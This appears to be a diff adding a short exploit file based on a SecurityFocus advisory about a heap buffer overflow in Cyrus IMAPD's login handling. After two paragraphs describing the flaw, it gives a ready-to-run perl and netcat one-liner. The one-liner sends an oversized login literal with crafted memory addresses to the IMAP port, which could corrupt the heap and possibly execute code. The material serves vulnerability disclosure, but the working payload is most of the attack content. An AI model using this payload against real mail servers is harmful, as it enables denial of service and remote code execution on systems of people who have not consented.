@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/6298/info
+
+Cyrus IMAPD is a freely available, open source Interactive Mail Access Protocol (IMAP) daemon. It is available for Unix and Linux operating systems.
+
+It has been reported that Cyrus IMAPD does not sufficiently handle overly long strings. In some cases, when a user connects to the daemon, and upon negotiating the connection sends a login string of excessive length, a buffer overflow occurs. This could result in heap corruption and arbitrary words in memory being overwritten. It may be possible to exploit this issue to execute arbitrary code.
+
+perl -e 'print "x login {4294967295}\r\n\xf0\xef\xff\xbf\x90\xef\xff\xbf\xfc\xff\xff\xff\xfc\xff\xff\xff";'|nc localhost imap2
+<ctrl-c>
